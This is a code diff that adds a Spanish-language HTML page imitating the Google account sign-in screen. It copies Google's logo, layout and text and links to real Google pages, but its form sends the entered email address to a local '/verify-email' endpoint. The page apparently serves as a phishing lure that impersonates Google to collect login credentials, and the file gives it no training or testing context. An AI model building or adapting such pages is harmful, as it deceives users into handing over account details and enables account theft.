@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Cuenta de Google</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', 'Roboto', sans-serif; }
+        body { background: #fff; color: #202124; font-size: 14px; }
+        .container { max-width: 450px; margin: 60px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
+        .logo { text-align: center; margin-bottom: 16px; }
+        .logo img { width: 75px; height: 24px; }
+        .header { text-align: center; margin-bottom: 24px; }
+        .header h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+        .header p { color: #5f6368; font-size: 16px; }
+        .form-group { margin-bottom: 24px; }
+        .google-input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; }
+        .google-input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+        .links { margin: 8px 0 32px; }
+        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .links a:hover { text-decoration: underline; }
+        .info { color: #5f6368; font-size: 14px; margin: 24px 0; line-height: 1.5; }
+        .button-group { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
+        .create-account { color: #1a73e8; font-weight: 500; text-decoration: none; padding: 10px 8px; border-radius: 4px; }
+        .create-account:hover { background: #f6fafe; }
+        .next-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
+        .next-button:hover { background: #0d62d9; }
+        @media (max-width: 480px) { .container { margin: 20px auto; padding: 24px; border: none; } }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google">
+        </div>
+        
+        <div class="header">
+            <h1>Iniciar sesión</h1>
+            <p>Utiliza tu cuenta de Google</p>
+        </div>
+
+        <form action="/verify-email" method="post">
+            <div class="form-group">
+                <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
+            </div>
+            
+            <div class="links">
+                <a href="https://accounts.google.com/signup/v2/createaccount?flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank">¿Has olvidado tu correo electrónico?</a>
+            </div>
+            
+            <div class="info">
+                ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada. 
+                <a href="https://support.google.com/chrome/answer/6130773?hl=es" target="_blank">Más información</a>
+            </div>
+            
+            <div class="button-group">
+                <a href="https://accounts.google.com/signup/v2/createaccount?flowName=GlifWebSignIn&flowEntry=SignUp" class="create-account" target="_blank">Crear cuenta</a>
+                <button type="submit" class="next-button">Siguiente</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
